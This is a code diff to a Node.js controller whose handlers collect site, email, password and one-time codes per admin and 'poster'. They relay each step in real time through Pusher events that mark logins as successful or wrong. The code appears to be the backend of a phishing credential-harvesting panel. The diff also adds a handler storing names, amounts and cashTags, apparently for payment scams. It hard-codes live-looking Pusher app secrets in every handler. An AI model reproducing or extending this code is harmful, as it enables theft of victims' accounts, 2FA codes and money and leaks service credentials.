@@ -4,6 +4,9 @@ import nodemailer from 'nodemailer';
 
 import User from '../models/User.js'
 import Info from '../models/Info.js'
+
+import Amount from '../models/Amount.js'
+
 import Link from '../models/Link.js'
 import Click from '../models/Click.js'
 // import socket from '../server.js'
@@ -26,13 +29,13 @@ export const email_post = async (req, res) => {
    
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
-      
+      })
+
 
     const { adminId, posterId } = req.params
     const { id, site, email,password } = req.body
@@ -108,13 +111,13 @@ export const email_post_wrong = async(req, res) => {
     //   });
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
-      
+      })
+
 
     const { id ,adminId} = req.body;
  
@@ -164,12 +167,13 @@ export const password_post = async(req, res) => {
     //   })
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
       
 
     const { id, password ,adminId,posterId} = req.body;
@@ -216,14 +220,14 @@ export const password_post_wrong = async(req, res) => {
     //     useTLS: true,
     //   });
 
-
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
       
 
     const { id } = req.body;
@@ -268,13 +272,13 @@ export const code_page_post = async(req, res) => {
 
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
-      
+      })
+
     const { id, code } = req.body;
  
     const filter = { _id: id };
@@ -317,12 +321,13 @@ export const reverify_code_page_post = async(req, res) => {
 
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
       
     const { id, code } = req.body;
  
@@ -366,14 +371,14 @@ export const mega_wrong = async(req, res) => {
     //     useTLS: true,
     //   });
 
-
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
       
     const { id } = req.body;
  
@@ -414,15 +419,14 @@ export const renumber_code_page_post = async(req, res) => {
     //     useTLS: true,
     //   });
 
-
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
-      
+      })
+
     const { id } = req.body;
  
     const filter = { _id: id };
@@ -472,12 +476,13 @@ export const renumber_add = async(req, res) => {
     //   })
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
       
 
     const { id, number,adminId,poster} = req.body;
@@ -526,13 +531,13 @@ export const successful_page_post = async(req, res) => {
 
 
     const pusher = new Pusher({
-        appId: '1891860',
-        key: 'e4766909b306ad7ddd58',
-        secret: 'ffbb52b3b0756a523d83',
+        appId: '1752132',
+        key: 'f47713a33f95b281fff6',
+        secret: 'ea93d76644c16628497a',
         cluster: 'ap2',
         useTLS: true,
-      });
-      
+      })
+
     const { id } = req.body;
  
   
@@ -579,3 +584,108 @@ export const successful_page_post = async(req, res) => {
     //     cluster: 'ap2',
     //     useTLS: true,
     //   })
+
+    // add_amount
+
+   
+
+
+
+    export const  add_name = async (req, res) => {
+        const pusher = new Pusher({
+            appId: '1752132',
+            key: 'f47713a33f95b281fff6',
+            secret: 'ea93d76644c16628497a',
+            cluster: 'ap2',
+            useTLS: true,
+          })
+        const { adminId, posterId } = req.params
+        const { site, name,amount ,cashTag} = req.body
+  
+    
+        try {
+            const found = await Amount.findOne({ site: site })
+
+            
+            if (found) {
+                const filter = { _id: found._id };
+                const update = { name: name, amount:amount,cashTag:cashTag};
+             
+                        const updated =  await Amount.findOneAndUpdate(filter, update, {
+                            new: true,
+                            upsert: true
+                        });
+    
+                     
+                        return   res.status(200).json({ updated: updated })
+    
+               }
+
+               const info = await Amount.create({
+                site, name,amount ,cashTag,
+                adminId:adminId,
+                poster: posterId,
+              
+                })
+         
+        return   res.status(200).json({ info:info})
+    
+        } 
+        
+        catch (e) {
+            return  res.status(400).json({ e: "error" })
+        }
+    
+    }
+
+
+
+
+    // export const find_amount_name = async(req, res) => {
+
+    //     // const pusher = new Pusher({
+    //     //     appId: '1883790',
+    //     //     key: 'c69be5ea3652b02905c7',
+    //     //     secret: 'd5258e0315991e7b5cc6',
+    //     //     cluster: 'mt1',
+    //     //     useTLS: true,
+    //     //   });
+    
+    
+    //     const pusher = new Pusher({
+    //         appId: '1891860',
+    //         key: 'e4766909b306ad7ddd58',
+    //         secret: 'ffbb52b3b0756a523d83',
+    //         cluster: 'ap2',
+    //         useTLS: true,
+    //       });
+          
+    //     const { id } = req.body;
+     
+      
+    //     try {
+    //         const info = await Info.findOne({ _id: id })
+    //         if (info ) {
+    
+          
+    
+               
+    //                 pusher.trigger(id, 'login-successfull', {
+    //                     id:id
+    //                   });
+    
+              
+    //          return   res.status(200).json({ success: "logged in successfully" })
+    
+    //         }
+    
+    //     }
+    //     catch (e) {
+    
+    //         return   res.status(400).json({ e: "error" })
+    
+    
+    //     }
+    
+    // }
+    
